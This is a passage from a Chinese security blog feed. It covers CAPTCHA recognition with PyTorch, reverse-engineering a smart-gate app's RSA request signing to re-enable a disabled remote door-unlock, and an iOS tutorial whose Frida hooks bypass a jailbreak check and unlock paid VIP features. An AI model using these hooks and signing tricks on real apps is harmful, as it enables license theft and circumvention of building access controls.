self.fc1(x)</span><br><span class="line">        x = self.fc2(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><p>nn.Sequential()可以看作模块的有序容器，可以方便快捷的搭建神经网络。<br>网络的输入是一个shape为<code>[batch, 3, 60, 180]</code>的张量，batch代表的是一个批次图片数量，3代表输入的图片是3通道的，即RGB，180和60则分别代表图片的宽和高。</p><p>经过上结构的卷积后，得到一个shape为<code>[batch, 128, 6, 18]</code>的张量，<code>x.view(x.size(0), -1)</code>将改变张量的shape为<code>[batch, 128*6*18]</code>，再用一个<code>[1024, 16*5]</code>的全连接层映射为一个<code>[batch, 16*5]</code>张量，这个就是模型的输出，其中<code>16</code>代表字符的种类数量，<code>5</code>代表一张验证码图片含有的字符数量。</p><p>接下来就是验证码的训练了：</p><p><img src="pytorch_train.png" alt="训练"></p><p>这里使用的是CPU进行训练的，训练样本生成了2000张，测试样本200张，刚开始训练准确率就可以到100%，而且速度不是太慢。</p><blockquote><p>验证码生成的脚本：<a href="https://github.com/fupinglee/Calculate_Captcha" target="_blank" rel="noopener">https://github.com/fupinglee/Calculate_Captcha</a></p><p>如果是在GPU下训练，在CPU下使用模型时，需要进行转换：</p><p><code>torch.load(model_path, map_location=torch.device(&#39;cpu&#39;))</code></p></blockquote><p>训练后测试的结果（200张测试准确率是100%，又另外生成了2000张验证码进行测试）：</p><p><img src="prtorch_test.png" alt="预测"></p><p>经过测试，使用pytorch训练的准确率可以达到99%。</p><p>完整代码：<a href="https://github.com/fupinglee/CalculateCaptcha_Recognition" target="_blank" rel="noopener">https://github.com/fupinglee/CalculateCaptcha_Recognition</a></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03  总结"></a>0x03  总结</h2><p>本文通过2种方法来对计算验证码进行识别。第一种方法使用简单，但识别率较低，可以针对一些比较简单的验证码（比如验证码未进行扭曲、干扰等）。第二种方法使用简单，但识别率比较依赖样本的数量，前期验证码标注是一件麻烦事，但对于本文这种简单的验证码，少量的样本准确率也会很高。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04  参考"></a>0x04  参考</h2><p>1.<a href="https://guanqr.com/tech/computer/shangxueba-crack/" target="_blank" rel="noopener">自动识别验证码破解上学吧题目答案</a></p><p>2.<a href="https://zhuanlan.zhihu.com/p/215700831" target="_blank" rel="noopener">pyTorch – 图形验证码识别</a></p><p>3.<a href="https://github.com/fupinglee/Calculate_Captcha" target="_blank" rel="noopener">验证码代码</a></p><p>4.<a href="https://github.com/fupinglee/CalculateCaptcha_Recognition" target="_blank" rel="noopener">pytorch识别验证码代码</a></p>]]></content>
      
      
      <categories>
          
          <category> 验证码识别 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 验证码识别 </tag>
            
            <tag> 计算验证码 </tag>
            
            <tag> pytorch </tag>
            
            <tag> 若依验证码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>当快捷指令遇上智能门锁</title>
      <link href="/2021/02/04/IOS-ShortCut-And-Smart-Lock/"/>
      <url>/2021/02/04/IOS-ShortCut-And-Smart-Lock/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>前段时间朋友小区换了一个智能门禁系统，户主通过一个APP进行管理，可以远程进行开锁操作。刚好这段时间在使用IOS的快捷指令操作，于是想做一个一键开门的快捷指令，直接通过快捷指令来完成开门的操作。</p><a id="more"></a><h3 id="0x02-逆向分析"><a href="#0x02-逆向分析" class="headerlink" title="0x02 逆向分析"></a>0x02 逆向分析</h3><p>首先打开APP进行抓包，发现参数中有一个加密的sign值。</p><p><img src="01.png" alt="抓包"></p><p>sign值与其他参数都有关系，修改其他参数会提示<code>签名验证失败</code>，而且时间久了该数据包不可用，提示<code>时间不正确，请调整时间</code>。</p><p>于是接下来对APP进行逆向，分析sign值是如何生成的。APP是从APPStore上下载的，首先第一步先进行砸壳。</p><p>数据线连接越狱的手机，打开app，执行<code>frida-ps -Ua</code>,查看Identifier</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Ua</span><br><span class="line"> PID  Name    Identifier</span><br><span class="line">----  ------  --------------------</span><br><span class="line">1823  xx生活  com.xx.xxlife</span><br><span class="line">1808  微信    com.tencent.xin</span><br><span class="line">1190  邮件    com.apple.mobilemail</span><br></pre></td></tr></table></figure><p>使用frida-ios-dump砸壳</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iproxy 2222 22</span><br><span class="line"><span class="built_in">cd</span> frida-ios-dump //在dump.py中配置好账号信息</span><br><span class="line">python3 dump.py com.xx.xxlife//砸壳</span><br></pre></td></tr></table></figure><p>解压得到的ipa文件，使用IDA打开Mac-O文件，在<code>Strings window</code>搜索<code>appUser/login</code></p><p><img src="02.png" alt="搜索字符串"></p><p>找到后查找引用</p><p><img src="03.png" alt="查找引用"></p><p>继续查找</p><p><img src="04.png" alt="继续查找引用"></p><p>发现在<code>+[LoginViewModel login:password:success:failure:]</code>方法中调用了。</p><p><img src="05.png" alt="login方法"></p><p>双击进入<code>-[RequestManager POST_URLString:parameters:showIndicatior:success:failure:]</code>方法，</p><p><img src="06.png" alt="POST_URLString方法"></p><p>在该方法中调用了<code>-[RequestManager RSAWithDic:]</code>方法，根据方法名可以猜出该方法是对参数进行了RSA加密。</p><p>打开<code>-[RequestManager RSAWithDic:]</code>方法</p><p><img src="07.png" alt="RSA加密方法"></p><p>发现参数sign是由其他参数进行RSA加密获得的。查看加密的参数格式的话可以通过<code>frida-trace</code>进行hook查看。</p><p>可以对<code>-[RequestManager convertToString:]</code>方法或者<code>+[RSAUtil encryptString:publicKey:]</code>方法进行hook。</p><p>查看<code>-[RequestManager convertToString:]</code>方法的参数与返回值，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -f com.xx.xxlife -m <span class="string">"-[RequestManager convertToString:]"</span></span><br></pre></td></tr></table></figure><p><img src="08.png" alt="追踪convertToString方法"></p><p> Ctrl-C 停止运行，修改convertToString_.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  onEnter(log, args, state) &#123;</span><br><span class="line">    log(<span class="string">`-[RequestManager convertToString:<span class="subst">$&#123;args[<span class="number">2</span>]&#125;</span>]`</span>);</span><br><span class="line">    log(ObjC.Object(args[<span class="number">2</span>]));</span><br><span class="line">  &#125;,</span><br><span class="line">  onLeave(log, retval, state) &#123;</span><br><span class="line">    log(ObjC.Object(retval));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次运行，可以看到参数与返回值</p><p><img src="09.png" alt="重新追踪convertToString方法"></p><p>查看<code>+[RSAUtil encryptString:publicKey:]</code>方法的参数与返回值，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -f com.xx.xxlife -m <span class="string">"+[RSAUtil encryptString:publicKey:]"</span></span><br></pre></td></tr></table></figure><p><img src="10.png" alt="追踪RSA加密"></p><p>由上面的hook可以看到加密的参数格式以及RSA的public key，接下来进行验证一下。</p><p>这里有一个问题，当使用该public key进行加密时，当加密的数据长度大于117时，会报错。</p><p><img src="11.png" alt="RSA加密出错"></p><p>解决的方法是对加密的数据根据长度117进行分割，使用rsa加密后拼接，最后返回拼接后的数据。</p><p><img src="12.png" alt="解决RSA加密出错"></p><p>修改后可以成功登录，接下来是一键开门的操作。</p><p>当使用一键开门的功能时提示<code>该小区未开启一键开门功能</code></p><img src="13.png" alt="APP一键开门" style="zoom:50%;"><blockquote><p>之前是可以使用该功能的，可能由于有业主频繁的开门，物业怕影响正常的使用，后来该功能就不可用了。</p></blockquote><p>根据关键字定位到<code>sub_1000B5978</code>函数</p><p><img src="14.png" alt="sub_1000B5978函数"></p><p>发现是否开启一键开门功能是根据<code>isClickOpen</code>来判断的，当该值不为2时可以使用该功能。在操作APP的时候可以发现返回值中有<code>isClickOpen</code>，通过拦截数据包修改该值为非2的值，如修改为1。</p><p><img src="15.png" alt="修改isClickOpen"></p><p>再次使用一键开门功能可以正常使用。该功能发送的请求：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST /xxxxApi/userCommunity/IsOpenDoor HTTP/<span class="number">1.1</span></span><br><span class="line">Host: xxxxapp.xxxxxxx.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">User-Agent: PerfectLife/3.01.0 (iPhone; iOS 12.4.1; Scale/2.00)</span></span><br><span class="line"><span class="comment">Accept-Language: zh-Hans-CN;q=1</span></span><br><span class="line"><span class="comment">Content-Length: 545</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">accessToken=84379_2eb78c1f6249447a9922039f35fc1fd7&amp;applicationType=2&amp;deviceType=2&amp;houseId=xxxxx&amp;sign=ZkZMPY2OHqCWlW4s%2BXfKFs3pmMfMbO95nGZVex/j7ci2jIakkS8J8wAnq%2BcjRygDI/vsuxPgz/SNRHRXlkzoGcqyglE483PDMbVzYBdtnLtrWFmEl/APAepcgT/Vsap7kr5vhjyf73HsAMFRwd0jKLnhX/Qy04l3FIMlvEs9mW1t7FGEkfRTuCpqz8cz%2B8Db4u8h8HOvyYS1SQiKNene0gdGztNxkFGayf1hPjPOWbSCpdQ9NbkPJ/4vSrGO%2B5HfB8umHvFYeamtByHdwiQsnfzMKcFuw4fGfG6nU35xBOsS1hY%2BWyeMh6/%2BPkXW%2BcyqWjT%2BssTp5F7IZhVibF/zcA%3D%3D&amp;terminalCode=865xxxx&amp;timestamp=1611820323000&amp;version=3.01.0&amp;versionCode=3010</span></span><br></pre></td></tr></table></figure><p>其中参数<code>houseId</code>是户主的房屋id，是固定值，与登录的用户有关。可以通过接口<code>appUserHouse/getHouseAndFocusList</code>获取。</p><p>参数<code>terminalCode</code>是小区门的编码，该值可能会变化，可以通过接口<code>door/list</code>获取。</p><p>返回的内容</p><p><img src="16.png" alt="一键开门返回包内容"></p><p>然后就可以利用代码实现一键开门的操作</p><p><img src="17.png" alt="使用代码一键开门"></p><blockquote><p>为了不影响正常使用，这里仅获取houseId与terminalCode，不进行开门操作。</p></blockquote><p>接下来就是快捷指令的编写，实现一键控制。</p><h3 id="0x03-快捷指令编写"><a href="#0x03-快捷指令编写" class="headerlink" title="0x03 快捷指令编写"></a>0x03 快捷指令编写</h3><p>如果结合其他APP或者借助其他平台的话很容易就可以编写快捷指令，如可以使用<code>Pythonista</code>(需付费下载)，复制上面的python脚本，直接通过快捷指令调用，也可以通过快捷指令登录SSH运行脚本(需要有服务器)。</p><img src="18.png" alt="快捷指令运行SSH脚本" style="zoom:50%;"><p>但对于普通用户来说这种操作不易实现（需要一定的成本），这里采取了一种稍微繁琐的方法，但都尽量采用快捷指令来实现（或者借助免费的应用来实现）。</p><p>以登录过程为例，进行快捷指令的编写。</p><p>登录过程所需的参数：</p><p><img src="canshu.png" alt="参数"></p><table><thead><tr><th align="center">参数名称</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">accessToken</td><td align="center">登录时为空</td></tr><tr><td align="center">applicationType</td><td align="center">当前环境下固定值2</td></tr><tr><td align="center">deviceType</td><td align="center">当前环境下固定值2</td></tr><tr><td align="center">password</td><td align="center">密码</td></tr><tr><td align="center">phone</td><td align="center">手机号</td></tr><tr><td align="center">sign</td><td align="center">对其他参数进行RSA加密获取</td></tr><tr><td align="center">timestamp</td><td align="center">当前时间的时间戳</td></tr><tr><td align="center">version</td><td align="center">当前版本3.01.0</td></tr><tr><td align="center">versionCode</td><td align="center">当前版本3010</td></tr></tbody></table><p>其中时间戳和RSA加密的sign值需要去获取，获取时间戳可以通过快捷指令来实现。</p><img src="19.png" alt="获取时间戳快捷指令" style="zoom:50%;"><p>RSA加密的话，本来可以借助在线平台来实现，但是由于使用该APP的Public key进行加密时，待加密字符串长度大于117时会报错。</p><p><img src="20.png" alt="在线RSA加密出错"></p><p>使用截取字符串的话快捷指令没有截取文本，只有一个根据条件拆分字符，所以这里打算借助其他APP通过执行JavaScript脚本来实现。这里采用的APP是JSBOX，虽然该APP有很多功能，但是都需要高级版才可以使用。不过免费版可以通过快捷指令来执行JavaScript脚本。</p><p>JS实现RSA加密可以使用<a href="http://travistidwell.com/jsencrypt/" target="_blank" rel="noopener">jsencrypt</a> ，主要代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**省略jsencrypt代码**/</span></span><br><span class="line"><span class="keyword">var</span> PUBLIC_KEY = <span class="string">'MIGfMA0GCSqGSI......7nNQIDAQAB'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> encrypt = <span class="keyword">new</span> JSEncrypt();</span><br><span class="line">encrypt.setPublicKey(<span class="string">'-----BEGIN PUBLIC KEY-----'</span> + PUBLIC_KEY + <span class="string">'-----END PUBLIC KEY-----'</span>);</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">'待加密字符串'</span>;</span><br><span class="line"><span class="keyword">var</span> divide =  <span class="built_in">parseInt</span>(str.length / <span class="number">117</span>);</span><br><span class="line"><span class="keyword">if</span> (divide &gt; <span class="number">0</span>)&#123;divide=divide;&#125; <span class="keyword">else</span> divide=divide + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> line = divide ;</span><br><span class="line"><span class="keyword">if</span>(str.length % <span class="number">117</span> != <span class="number">0</span>)&#123;</span><br><span class="line">    line = divide + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> encrypted = <span class="string">''</span> ;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;line ;i++)&#123;</span><br><span class="line">    encrypted += b64tohex(encrypt.encrypt(str.substring(i*<span class="number">117</span>,(i+<span class="number">1</span>)*<span class="number">117</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> result = hex2b64(encrypted);</span><br><span class="line"></span><br><span class="line">result;</span><br></pre></td></tr></table></figure><p>RSA加密的快捷指令</p><p><img src="21.png" alt="RSA加密快捷指令"></p><p>这样借助JSBOX运行JavaScript来实现RSA加密就完成了，剩下的就好做了。</p><p>一个快捷指令可以看作是程序里的一个函数，可以在其他快捷指令中来调用。使用快捷指令的的登录过程如下：</p><p><img src="22.png" alt="登录快捷指令"></p><p>登录成功返回accessToken，然后在其他操作中需要使用该token。其他的操作都类似，先在快捷指令中调用登录，然后请求相关的api即可。如开门的快捷指令如下：</p><img src="23.png" alt="开门快捷指令" style="zoom:50%;"><p>使用的话可以直接点击<code>开东门</code>的快捷指令，或者使用语音<code>嘿Siri，开东⻔</code>来开启小区入口门。开启其他大门类似，修改对应的terminalCode即可。</p><p>给别人使用的话也很简单，通过快捷指令<a href="https://www.icloud.com/shortcuts/b7cf16f2de72470ab165f80c23efeb5a" target="_blank" rel="noopener"><code>Backup Shortcuts To iCloud</code></a>将所需的快捷指令共享给别人，然后下载JSBOX即可使用。</p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>本文通过快捷指令实现了一个”智能开门”指令，快捷指令实现起来比较简单，但是功能有限制，有些功能需要借助一下其他的APP或者平台才能实现，本文为了大众化才采用了比较繁琐的方法来实现，如果是自己使用的话当然是怎么方便怎么来。</p>]]></content>
      
      
      <categories>
          
          <category> IOS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOS逆向 </tag>
            
            <tag> 快捷指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOS逆向初探</title>
      <link href="/2020/12/16/IOS-APP-tomatodo-Cracked/"/>
      <url>/2020/12/16/IOS-APP-tomatodo-Cracked/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文记录了某次逆向一个简单APP的过程，来简单介绍一下IOS逆向的流程，比较基础，属于入门级教程。包括砸壳、HOOK、插件的编写等一系列流程。</p><a id="more"></a><h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>前段时间在一个老师那里看到一群考研人的打卡信息，该APP能够详细的记录和分析学习过程。</p><img src="01.png" alt="考研人打卡信息" style="zoom:50%;"><p>于是就下载试用了一下。但是免费版有许多的限制。如免费版的话仅可以添加2个”习惯”类代办，</p><img src="02.png" alt="添加代办" style="zoom:33%;"><p>使用背景图也是需要开通季度卡的（虽然并没什么用）。</p><img src="03.png" alt="背景" style="zoom:33%;"><p>手机上打开”季度卡”页面，由于手机经过了越狱，在开通的时候提示<code>非常抱歉，由于Apple的安全策略，暂不支持越狱用户购买，可点击右上角获取帮助-其他问题联系我们解决</code>。</p><img src="04.png" alt="越狱禁止购买" style="zoom:33%;"><p>虽然免费版不影响正常使用，但是本着学习的态度想查看一下其越狱检测的绕过，结果发现竟然可以白嫖使用<code>VIP</code>功能。</p><h2 id="0x02-逆向分析"><a href="#0x02-逆向分析" class="headerlink" title="0x02 逆向分析"></a>0x02 逆向分析</h2><p>IOS下逆向常规操作判断该APP是否加壳(加密)，有壳的话先进行砸壳，然后利用IDA或者Hopper对脱壳后的Mach-O文件进行分析。首先需要准备一下环境和工具。</p><h3 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h3><p>手机设备：一台越狱的IOS手机，版本为12.4.1，安装了OpenSSH和Frida，Frida版本为14.1.3。</p><p>逆向分析工具：IDA或者Hopper。</p><p>开发工具：Xcode。</p><p><del>抓包工具：BurpSuite 或者Charles。</del></p><p>电脑上安装Frida版本为14.1.3。</p><p>由于是APPStore下载的APP，是经过了加壳的。接下来开始对该APP进行砸壳。</p><h3 id="2-砸壳"><a href="#2-砸壳" class="headerlink" title="2. 砸壳"></a>2. 砸壳</h3><p>砸壳的脚本有很多，如<a href="https://github.com/AloneMonkey/frida-ios-dump" target="_blank" rel="noopener">frida-ios-dump</a>、<a href="https://github.com/stefanesser/dumpdecrypted" target="_blank" rel="noopener">dumpdecrypted</a>、<a href="https://github.com/KJCracks/Clutch" target="_blank" rel="noopener">Clutch</a>、<a href="https://github.com/DerekSelander/yacd" target="_blank" rel="noopener">yacd</a>等，这里采用的工具是<a href="https://github.com/AloneMonkey/frida-ios-dump" target="_blank" rel="noopener">frida-ios-dump</a>。</p><p>安装方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/AloneMonkey/frida-ios-dump</span><br><span class="line"><span class="built_in">cd</span> frida-ios-dump</span><br><span class="line">pip install -r requirements.txt --upgrade</span><br></pre></td></tr></table></figure><p>安装完成所需的依赖后打开dump.py进行配置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User = <span class="string">'root'</span></span><br><span class="line">Password = <span class="string">'alpine'</span><span class="comment">#默认的密码</span></span><br><span class="line">Host = <span class="string">'localhost'</span></span><br><span class="line">Port = <span class="number">2222</span> <span class="comment">#根据自己的端口进行修改</span></span><br><span class="line">KeyFileName = <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>使用方法:</p><p><code>python3 dump.py APP名字</code> 或者<code>python3 dump.py Bundle identifier</code></p><p>将手机与电脑连接，打开APP，执行<code>frida-ps -Ua</code>,查看APP名字和Identifier。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Ua</span><br><span class="line"> PID  Name    Identifier</span><br><span class="line">----  ------  --------------------</span><br><span class="line">7312  APP名字  com.xxxx.tomatodo</span><br></pre></td></tr></table></figure><p>然后进行砸壳</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iproxy 2222 22</span><br><span class="line">python3 dump.py com.xxxx.tomatodo</span><br></pre></td></tr></table></figure><blockquote><p>也可以执行<code>python3 dump.py APP名字</code>进行砸壳</p></blockquote><p><img src="05.png" alt="砸壳"></p><p>砸了壳后提取出<code>TomatoTime</code>可执行文件，扔到<code>IDA</code>或者<code>Hopper</code>里面分析。</p><h3 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h3><p>根据关键文字进行搜索，这里搜索的是”越狱”。由于Mac上的IDA7.0搜不出来中文字符，所以可以使用Hopper搜索，找到函数位置后使用IDA打开。也可以全程使用Hopper进行分析。</p><p>使用hopper搜索”越狱”字符串</p><p><img src="06.png" alt="搜索字符串"></p><p>发现是在方法<code>startPay:</code>中</p><p><img src="07.png" alt="找到方法startPay:"></p><p>找到后可以继续使用Hopper进行分析，或者在IDA中分析，我在这里采用了IDA。</p><p>直接在函数中搜索<code>-[SeasonCardController startPay:]</code>。</p><p><img src="08.png" alt="IDA搜索方法"></p><p>发现是该APP判断是否越狱，是根据是否存在Cydia来进行判断的。当<code>/Applications/Cydia.app</code>文件存在时，则提示用户越狱。</p><p>绕过这种越狱检测的方法也很简单，直接进行Hook <code>fileExistsAtPath:</code>方法即可。当判断<code>/Applications/Cydia.app</code>文件存在时将返回值改为0，即可绕过这里的越狱判断。</p><h3 id="4-越狱绕过"><a href="#4-越狱绕过" class="headerlink" title="4.  越狱绕过"></a>4.  越狱绕过</h3><p>根据上面的分析，开始对<code>-[NSFileManager fileExistsAtPath:]</code>进行Hook。</p><p>代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jailbreakPaths = [<span class="string">"/Applications/Cydia.app"</span>];</span><br><span class="line"><span class="keyword">var</span> isJailBreakChecked = <span class="literal">false</span></span><br><span class="line">Interceptor.attach(ObjC.classes.NSFileManager[<span class="string">"- fileExistsAtPath:"</span>].implementation, &#123;</span><br><span class="line">  onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">    isJailBreakChecked = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.path = <span class="keyword">new</span> ObjC.Object(args[<span class="number">2</span>]).toString(); <span class="comment">// check if the looked up path is in the list of common_paths</span></span><br><span class="line">    <span class="keyword">if</span> (jailbreakPaths.indexOf(<span class="keyword">this</span>.path) &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"fileExistsAtPath: check for -&gt;  "</span> + <span class="keyword">this</span>.path);</span><br><span class="line">      isJailBreakChecked = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isJailBreakChecked) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"change before:"</span>+retval);</span><br><span class="line">    retval.replace(<span class="number">0</span>);<span class="comment">//当判断/Applications/Cydia.app文件存在时将返回值改为0</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"change after:"</span> + retval);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l tomatodo-jailbreak-bypass.js -f  com.xxxx.tomatodo --no-pause</span><br></pre></td></tr></table></figure><p><img src="09.png" alt="越狱绕过"></p><p>此时再次打开APP，可以成功进入季度卡开通界面。</p><img src="10.png" alt="越狱绕过结果" style="zoom:33%;"><p>当然也可以使用objection进行绕过越狱检测。</p><p>使用方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g &quot;com.xxxx.tomatodo&quot; explore --startup-command &quot;ios jailbreak disable&quot;</span><br></pre></td></tr></table></figure><p><img src="11.png" alt="objection越狱绕过"></p><p>也是可以成功绕过越狱检测的。</p><h3 id="5-Vip功能绕过"><a href="#5-Vip功能绕过" class="headerlink" title="5.Vip功能绕过"></a>5.Vip功能绕过</h3><p>在<code>-[SeasonCardController startPay:]</code>方法中有第53行这样一个判断，根据意思应该是判断是否激活。</p><p><img src="12.png" alt="isActive"></p><p>根据上面的代码，猜测<code>+[CommonUtil isActive]</code>的结果是判断是否开通了季度卡的依据。在这里使用<code>frida-trace</code>进行追踪，<code>frida-trace</code> 用于跟踪函数或者 Objective-C 方法的调用，-m 跟踪某个 Objective-C 方法。</p><p>使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -f com.xxxx.tomatodo -m <span class="string">"+[CommonUtil isActive]"</span></span><br></pre></td></tr></table></figure><p>它会在当前目录下生成一个 <code>__handlers__</code>目录，然后在目录下生成一个 <code>类名/方法名.js</code> 文件，这里的文件名为<code>/CommonUtil/isActive.js</code>。当在调用该方法时，会输出以下信息，按 Ctrl-C 可以停止跟踪。</p><p><img src="13.png" alt="frida-trace"></p><p>打开生成的js文件会看到有两个函数，onEnter 是进入该函数时会执行的代码，onLeave 是该函数执行完离开时会执行的代码。在这里直接修改返回值retval为1。其代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  onEnter(log, args, state) &#123;</span><br><span class="line">    log(<span class="string">`+[CommonUtil isActive]`</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  onLeave(log, retval, state) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"change before:"</span>+retval);</span><br><span class="line">    retval.replace(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"change after:"</span>+retval);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次执行 frida-trace，<code>/CommonUtil/isActive.js</code> 文件不会覆盖，会执行刚才添加好的代码，如下：</p><p><img src="14.png" alt="fridaHook-isActive"></p><p>此时发现不仅可以使用季度卡背景</p><img src="15.png" alt="bg-freeUse" style="zoom:33%;"><p>而且也可以可以添加多个习惯类代办</p><img src="16.png" alt="frida-isActivite" style="zoom:33%;"><blockquote><p>其实并不是，在测试的时候由于没有注意，添加了两个<code>习惯</code>和一个<code>目标</code>，导致认为通过hook <code>+[CommonUtil isActive]</code>方法可以解锁全部的VIP功能，一直到后来写插件的时候才发现该错误，在编写非越狱插件时有详细的分析。</p></blockquote><p>所以通过hook方法 <code>+[CommonUtil isActive]</code>可以实现到<code>VIP功能</code>的使用。</p><p>但这些都是在越狱手机上使用的，如果想在非越狱手机上使用的话，就需要使用一些插件来运行在非越狱手机上。</p><h2 id="0x03-编写非越狱插件"><a href="#0x03-编写非越狱插件" class="headerlink" title="0x03 编写非越狱插件"></a>0x03 编写非越狱插件</h2><p>编写插件采用了非越狱插件开发集成神器<a href="https://github.com/AloneMonkey/MonkeyDev" target="_blank" rel="noopener">MonkeyDev</a>，集成了theos+Tweaks+Reveal.framework +Cycript +class-dump+CaptainHook。</p><p>安装和卸载可以参考<a 